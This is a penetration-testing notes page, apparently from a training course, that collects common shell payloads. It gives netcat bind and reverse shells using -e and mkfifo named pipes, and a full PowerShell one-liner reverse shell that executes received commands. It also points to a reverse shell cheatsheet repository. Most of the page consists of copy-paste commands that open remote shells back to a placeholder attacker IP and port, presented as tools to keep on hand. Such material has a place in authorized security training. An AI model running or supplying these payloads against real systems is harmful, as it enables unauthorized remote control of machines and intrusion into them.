---
icon: square-terminal
---

# common shell payload

In some versions of netcat (including the `nc.exe` Windows version included with Kali at `/usr/share/windows-resources/binaries`, and the version used in Kali itself: `netcat-traditional`) there is a `-e` option which allows you to execute a process on connection. For example, as a listener:

`nc -lvnp <PORT> -e /bin/bash`\


Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target.\


However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\


The following paragraph is the technical explanation for this command. It's slightly above the level of this room, so don't worry if it doesn't make much sense for now -- the command itself is what matters.

> _The command first creates a_ [_named pipe_](https://www.linuxjournal.com/article/2156) _at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._

<figure><img src="https://i.imgur.com/se5Fyn3.png" alt=""><figcaption></figcaption></figure>

A very similar command can be used to send a netcat reverse shell:

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\


This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

\


<figure><img src="https://i.imgur.com/Xf0hA5p.png" alt=""><figcaption></figcaption></figure>

***

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.\


This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

{% code overflow="wrap" %}
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" 
```
{% endcode %}

In order to use this, we need to replace "\<IP>" and "\<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:

![](https://i.imgur.com/T6o7kOL.png)

***

For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what's available.
